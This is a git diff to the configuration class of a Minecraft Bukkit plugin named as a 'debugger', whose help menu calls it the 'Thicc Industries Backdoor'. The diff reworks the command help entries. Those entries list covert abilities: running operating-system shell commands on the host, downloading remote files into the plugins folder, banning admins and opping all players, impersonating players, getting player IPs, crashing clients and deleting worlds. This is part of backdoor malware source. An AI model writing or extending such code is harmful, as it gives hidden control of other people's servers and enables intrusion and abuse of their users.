@@ -4,6 +4,7 @@
 
 package com.thiccindustries.debugger;
 
+import org.apache.commons.lang.ObjectUtils;
 import org.bukkit.ChatColor;
 
 public class Config {
@@ -61,6 +62,7 @@ public class Config {
     // color of help command syntax 
     public static final ChatColor help_command_desc_color = ChatColor.WHITE;
 
+    public static final ChatColor help_command_required_color = ChatColor.RED;
     // color of help 
     public static final ChatColor help_detail_color = ChatColor.GREEN;
 
@@ -69,71 +71,168 @@ public class Config {
                                                         "[Server] ALL ADMINS HAVE BEEN BANNED\n" +
                                                         "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
 
+
+    public static class Param {
+        String name;
+        String description;
+        Boolean required;
+
+        public Param(String name, String description, Boolean required){
+            this.name = name;
+            this.description = description;
+            this.required = required;
+        }
+    };
+
     // Help message content
+    // TODO: This is a lot uglier than the old solution.
     public static final HelpItem[] help_messages = {
-            new HelpItem("help",        "[command]",                    "display this message, or description of command."),
-            new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
-            new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
-            new HelpItem("ban",         "(player) [reason] [source]",   "ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
-            new HelpItem("banip",       "(player) [reason] [source]",   "ip ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
-            new HelpItem("gm",          "(gamemode)",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
-            new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
-            new HelpItem("exec",        "(command)",                    "[Visible] Execute command as server console"),
-            new HelpItem("shell",       "(command)",                    "[Visible] Execute operating system as host.\nWarning: Command syntax differs between windows, mac, and linux hosts."),
-            new HelpItem("info",        "",                             "shows informatin about server"),
-            new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players, run this while not being op yourself"),
-            new HelpItem("seed",        "",                             "get the current world seed"),
-            new HelpItem("psay",        "(player) (message)",           "sends messages as player"),
-            new HelpItem("ssay",       "(message)",                    "sends messages as Server"),
-            new HelpItem("rename",      "[name]",                       "changes your nick"),
-            new HelpItem("reload",      "",                             "[Visible] Reloads the server"),
-            new HelpItem("getip",       "(player)",                     "gets ip of the player (def: nickname)"),
-            new HelpItem("listworlds",    "",                           "displays all worlds"),
-            new HelpItem("makeworld",      "(world)",                   "[Visible] Creates new world (def: world_name)"),
-            new HelpItem("delworld",     "(world)",                     "[Visible] Deletes a world (def: world_name)"),
-            new HelpItem("vanish",      "",                             "makes you vanish, tab included"),
-            new HelpItem("silktouch",   "[player]",                     "gives player silk touch hands (def: nickname)"),
-            new HelpItem("instabreak",  "[player]",                     "let's player mine instantly (def: nickname)"),
-            new HelpItem("crash",       "(player)",                     "crashes player's name (def: nickname)"),
-            new HelpItem("mindfuck",    "(method) (player)",            "Options: thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage, speed"),
-            new HelpItem("lock",        "(player), (all) or (console)", "locks the console or blocks player (def: nickname, all or console)"),
-            new HelpItem("unlock",      "(player), (all) or (console)", "unlocks the console or unblocks player (def: nickname, all or console)"),
-            new HelpItem("mute",        "(player) or (all)",            "mutes a player (def: nickname or all)"),
-            new HelpItem("unmute",      "(player) or (all)",            "unmutes a player (def: nickname or all)"),
-            new HelpItem("download",    "(url) (file)",                 "downloads a file, don't use special chars or spaces (def: url plugins/file.jar)"),
-            new HelpItem("coords",      "(player)",                     "get the coordinates of specified player"),
-            new HelpItem("auth",        "(player)",                     "Authorize user until next server restart."),
-            new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed"),
-            new HelpItem("tp",          "(x) (y) (z)",                  "[Visible] Teleport to specified coordinates"),
-            new HelpItem("stop",        "",                             "[Visible] Shutdown the server")
+            new HelpItem("help",  "display this message, or description of command.",
+                    new Param[]{new Param("command", "show command syntax", false)}),
+            new HelpItem("op","op specified player",
+                    new Param[]{new Param("player", "player to op", true)}),
+            new HelpItem("deop", "deop specified player",
+                    new Param[]{new Param("player", "player to deop", true)}),
+            new HelpItem("ban", "ban player with reason and source",
+                    new Param[]{new Param("player", "player to ban", true),
+                                new Param("reason", "ban reason", false),
+                                new Param("source", "player listed as ban source", false)}),
+            new HelpItem("banip",  "ip ban player with reason and source",
+                    new Param[]{new Param("player", "player to ip-ban", true),
+                                new Param("reason", "ban reason", false),
+                                new Param("source", "player listed as ban source", false)}),
+            new HelpItem("gm", "switch to specified gamemode",
+                    new Param[]{new Param("gamemode", "0, 1, 2, 3", true)}),
+            new HelpItem("give", "give the specified item in specified quantities",
+                    new Param[]{new Param("item", "item-id or name", true),
+                                new Param("count", "number of items", false)}),
+            new HelpItem("exec", "Execute command as server console",
+                    new Param[]{new Param("command", "server command to execute", true)}),
+            new HelpItem("shell","Execute operating system as host",
+                    new Param[]{new Param("command", "shell command to execute. Check server platform with " + command_prefix + "info", true)}),
+            new HelpItem("info", "shows informatin about server"),
+            new HelpItem("chaos", "Deop and ban ops, op all regular players"),
+            new HelpItem("seed", "get the current world seed"),
+            new HelpItem("psay", "sends messages as player",
+                    new Param[]{new Param("player", "player to impersonate", true),
+                                new Param("message", "message to send", true)}),
+            new HelpItem("ssay", "sends messages as Server",
+                    new Param[]{new Param("message", "message to send", true)}),
+            new HelpItem("rename", "changes your nick",
+                    new Param[]{new Param("name", "change nickname", true)}),
+            new HelpItem("reload", "[Visible] Reloads the server"),
+            new HelpItem("getip",  "gets ip of the player",
+                    new Param[]{new Param("player", "player to ip-trace", true)}),
+            new HelpItem("listworlds","displays all worlds"),
+            new HelpItem("makeworld", "Creates new world",
+                    new Param[]{new Param("name", "new world name", true)}),
+            new HelpItem("delworld", "Deletes a world",
+                    new Param[]{new Param("name", "world name to delete", true)}),
+            new HelpItem("vanish", "makes you vanish, tab included"),
+            new HelpItem("silktouch", "gives player silk touch hands",
+                    new Param[]{new Param("player", "player to give silk-touch", false)}),
+            new HelpItem("instabreak", "let's player mine instantly",
+                    new Param[]{new Param("player", "player to give insta-break", false)}),
+            new HelpItem("crash", "crashes player's name",
+                    new Param[]{new Param("player", "player to crash", false)}),
+            new HelpItem("troll", "Troll player in various ways",
+                    new Param[]{new Param("method", "Options: clear, thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage, speed", true),
+                                new Param("player", "player to troll", true),}),
+            new HelpItem("lock", "locks the console or blocks player",
+                    new Param[]{new Param("player", "'server', 'all', or player to lock", true)}),
+            new HelpItem("unlock", "unlocks the console or unblocks player",
+                    new Param[]{new Param("player", "'server', 'all', or player to unlock", true)}),
+            new HelpItem("mute", "mutes a player",
+                    new Param[]{new Param("player", "'all' or player to mute", true)}),
+            new HelpItem("unmute", "unmutes a player",
+                    new Param[]{new Param("player", "'all' or player to unmute", true)}),
+            new HelpItem("download", "downloads a file, don't use special chars or spaces",
+                    new Param[]{new Param("url", "URL of resource to download", true),
+                                new Param("file", "file path", true)}),
+            new HelpItem("coords", "get the coordinates of specified player",
+                    new Param[]{new Param("player", "player to grab coords of", true)}),
+            new HelpItem("auth", "Authorize user until next server restart.",
+                    new Param[]{new Param("player", "player to authorize", true)}),
+            new HelpItem("deauth", "Unauthorized player",
+                    new Param[]{new Param("player", "player to deauthorize", true)}),
+            new HelpItem("tp", "Teleport to specified coordinates",
+                    new Param[]{new Param("x", "x coordinate", true),
+                                new Param("y", "y coordinate", true),
+                                new Param("z", "z coordinate", true)}),
+            new HelpItem("stop", "Shutdown the server")
+
     };
 
     public static class HelpItem{
 
         private final String name;
-        private final String syntax;
+        private final Param[] params;
         private final String desc;
 
-        public HelpItem(String name, String syntax, String desc){
+        public HelpItem(String name, String desc, Param[] params){
             this.name = name;
-            this.syntax = syntax;
+            this.params = params;
             this.desc = desc;
         }
-
+        public HelpItem(String name, String desc){
+            this.name = name;
+            this.params = null;
+            this.desc = desc;
+        }
         public String getName(){
             return name;
         }
 
-        public String getSyntax(){
-            return syntax;
+        public Param[] getSyntax(){
+            return params;
         }
 
         public String getDesc(){
             return desc;
         }
+        public String getHelpEntry(){
+            return Config.help_command_name_color + Config.command_prefix + name + ": " + Config.help_command_desc_color + desc;
+        }
+        public String getSyntaxHelp(){
 
-        public String toString(){
-            return Config.help_command_name_color + name + " " + syntax + ": " + Config.help_command_desc_color + desc;
+            if(params == null){
+                return getHelpEntry();
+            }
+            StringBuilder sb = new StringBuilder();
+
+            sb.append(help_command_name_color + command_prefix + name + " ");
+            for(Param p : params){
+                sb.append(ChatColor.RESET);
+                sb.append(help_command_desc_color);
+                sb.append("(" + p.name + ") ");
+            }
+
+            sb.append("\n");
+
+            for(Param p : params){
+                sb.append(ChatColor.RESET);
+                sb.append("(" + p.name + ") " + p.description);
+                if(p.required)
+                    sb.append(help_command_required_color + " [Required]");
+                sb.append("\n");
+            }
+
+            return sb.toString();
+        }
+
+        public static String buildHelpMenu(){
+            return buildHelpMenu(0);
+        }
+        public static String buildHelpMenu(int page){
+            StringBuilder sb = new StringBuilder();
+            sb.append(help_detail_color + "Thicc Industries Backdoor\n");
+            sb.append(help_detail_color + "-----------------------------------------------------\n\n");
+            for(int i = 0; i < help_messages.length; ++i ){
+                sb.append(help_messages[i].getHelpEntry());
+                sb.append("\n");
+            }
+
+            return sb.toString();
         }
     }
 }
